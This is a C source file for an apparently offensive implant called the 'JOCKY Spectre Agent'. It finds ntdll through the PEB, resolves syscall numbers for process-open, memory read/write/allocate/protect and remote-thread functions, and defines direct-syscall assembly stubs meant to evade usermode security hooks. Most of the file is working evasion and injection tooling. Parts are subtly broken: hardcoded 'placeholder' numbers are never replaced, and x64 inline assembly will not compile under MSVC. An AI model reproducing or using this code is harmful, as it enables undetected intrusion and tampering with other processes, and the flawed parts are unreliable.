/*
 * JOCKY Spectre Agent — Direct Syscall Stubs
 * Resolves SSNs at runtime from ntdll .text section.
 * Invokes via inline syscall instruction — zero Win32 API surface.
 *
 * Compiled with: cl /O2 /GS- syscalls.c
 */

#include "syscalls.h"
#include <winternl.h>

/* Walk PEB → InMemoryOrderModuleList to find ntdll base.
 * ntdll is always the second entry (index 1). */
PVOID syscall_find_ntdll(void) {
#ifdef _WIN64
    PPEB peb = (PPEB)__readgsqword(0x60);
#else
    PPEB peb = (PPEB)__readfsdword(0x30);
#endif

    PLIST_ENTRY head = &peb->Ldr->InMemoryOrderModuleList;
    PLIST_ENTRY entry = head->Flink;  /* First = exe */
    entry = entry->Flink;             /* Second = ntdll */

    PLDR_DATA_TABLE_ENTRY mod = CONTAINING_RECORD(
        entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
    return mod->DllBase;
}

/* Resolve SSN by reading the stub at the function's export address.
 * ntdll stubs follow the pattern:
 *   4C 8B D1          mov r10, rcx
 *   B8 XX XX 00 00    mov eax, <SSN>
 *   ...
 *   0F 05             syscall
 * SSN is the 32-bit value at offset +4. */
DWORD syscall_resolve_ssn(PVOID ntdllBase, LPCSTR funcName) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)ntdllBase;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)((BYTE*)ntdllBase + dos->e_lfanew);

    PIMAGE_DATA_DIRECTORY exportDir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)
        ((BYTE*)ntdllBase + exportDir->VirtualAddress);

    PDWORD names     = (PDWORD)((BYTE*)ntdllBase + exports->AddressOfNames);
    PDWORD functions = (PDWORD)((BYTE*)ntdllBase + exports->AddressOfFunctions);
    PWORD  ordinals  = (PWORD)((BYTE*)ntdllBase + exports->AddressOfNameOrdinals);

    for (DWORD i = 0; i < exports->NumberOfNames; i++) {
        LPCSTR name = (LPCSTR)((BYTE*)ntdllBase + names[i]);
        if (strcmp(name, funcName) == 0) {
            PVOID funcAddr = (BYTE*)ntdllBase + functions[ordinals[i]];
            /* Read SSN from mov eax instruction at offset +4 */
            return *(DWORD*)((BYTE*)funcAddr + 4);
        }
    }
    return (DWORD)-1;
}

BOOL syscall_init(SYSCALL_TABLE *table) {
    PVOID ntdll = syscall_find_ntdll();
    if (!ntdll) return FALSE;

    table->NtQuerySystemInformation.ssn   = syscall_resolve_ssn(ntdll, "NtQuerySystemInformation");
    table->NtQuerySystemInformation.name  = "NtQuerySystemInformation";

    table->NtQueryInformationProcess.ssn  = syscall_resolve_ssn(ntdll, "NtQueryInformationProcess");
    table->NtQueryInformationProcess.name = "NtQueryInformationProcess";

    table->NtOpenProcess.ssn              = syscall_resolve_ssn(ntdll, "NtOpenProcess");
    table->NtOpenProcess.name             = "NtOpenProcess";

    table->NtReadVirtualMemory.ssn        = syscall_resolve_ssn(ntdll, "NtReadVirtualMemory");
    table->NtReadVirtualMemory.name       = "NtReadVirtualMemory";

    table->NtWriteVirtualMemory.ssn       = syscall_resolve_ssn(ntdll, "NtWriteVirtualMemory");
    table->NtWriteVirtualMemory.name      = "NtWriteVirtualMemory";

    table->NtAllocateVirtualMemory.ssn    = syscall_resolve_ssn(ntdll, "NtAllocateVirtualMemory");
    table->NtAllocateVirtualMemory.name   = "NtAllocateVirtualMemory";

    table->NtProtectVirtualMemory.ssn     = syscall_resolve_ssn(ntdll, "NtProtectVirtualMemory");
    table->NtProtectVirtualMemory.name    = "NtProtectVirtualMemory";

    table->NtCreateThreadEx.ssn           = syscall_resolve_ssn(ntdll, "NtCreateThreadEx");
    table->NtCreateThreadEx.name          = "NtCreateThreadEx";

    table->NtClose.ssn                    = syscall_resolve_ssn(ntdll, "NtClose");
    table->NtClose.name                   = "NtClose";

    return TRUE;
}

/*
 * Direct syscall stubs using inline assembly.
 * These bypass any usermode hooks on ntdll by invoking the syscall
 * instruction directly with the resolved SSN.
 */

#ifdef _WIN64
__declspec(naked) NTSTATUS NTAPI DirectNtQuerySystemInformation(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength)
{
    __asm {
        mov r10, rcx
        mov eax, 0x36       ; Placeholder — replaced at runtime with resolved SSN
        syscall
        ret
    }
}

__declspec(naked) NTSTATUS NTAPI DirectNtOpenProcess(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PCLIENT_ID ClientId)
{
    __asm {
        mov r10, rcx
        mov eax, 0x26       ; Placeholder SSN
        syscall
        ret
    }
}

__declspec(naked) NTSTATUS NTAPI DirectNtReadVirtualMemory(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T BufferSize,
    PSIZE_T NumberOfBytesRead)
{
    __asm {
        mov r10, rcx
        mov eax, 0x3F       ; Placeholder SSN
        syscall
        ret
    }
}
#endif
